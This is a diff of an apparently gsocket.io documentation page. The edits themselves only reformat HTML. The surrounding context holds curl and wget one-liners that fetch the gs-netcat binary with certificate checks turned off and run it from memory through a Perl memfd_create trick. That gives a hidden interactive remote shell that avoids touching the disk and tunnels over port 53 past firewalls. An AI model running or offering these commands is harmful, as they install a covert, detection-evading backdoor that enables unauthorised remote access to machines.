@@ -138,6 +138,7 @@ GS_PORT=53 bash deploy-all.sh
     </div>
 </div>
 
+  
 Useful environment variables:  
 
 |:---|:---|
@@ -169,8 +170,7 @@ Alternatively, start gs-netcat without the binary touching the remote file syste
 {% highlight shell %}
 curl -SsfLk https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/bin/gs-netcat_mini-linux-$(uname -m) | GS_PORT=53 GS_ARGS="-ilD -s ChangeMe" perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"-bash"'
 {% endhighlight %}
-            </div>
-        </div>
+            </div></div>
         <div class="tab">
             <input type="radio" name="css-tabs-manual" id="wget-manual" class="tab-switch">
             <label for="wget-manual" class="tab-label">Wget</label>
@@ -178,9 +178,8 @@ curl -SsfLk https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/
 {% highlight shell %}
 wget --no-check-certificate -qOgs https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/bin/gs-netcat_mini-linux-$(uname -m) | GS_PORT=53 GS_ARGS="-ilD -s ChangeMe" perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"-bash"'
 {% endhighlight %}
-            </div>
-        </div></div></div>
-
+</div>
+</div></div></div>
 - Change `ChangeMe` to your own secret. Don't use `ChangeMe`.
 - *GS_PORT=53* is only needed if port 443 is firewalled.
 
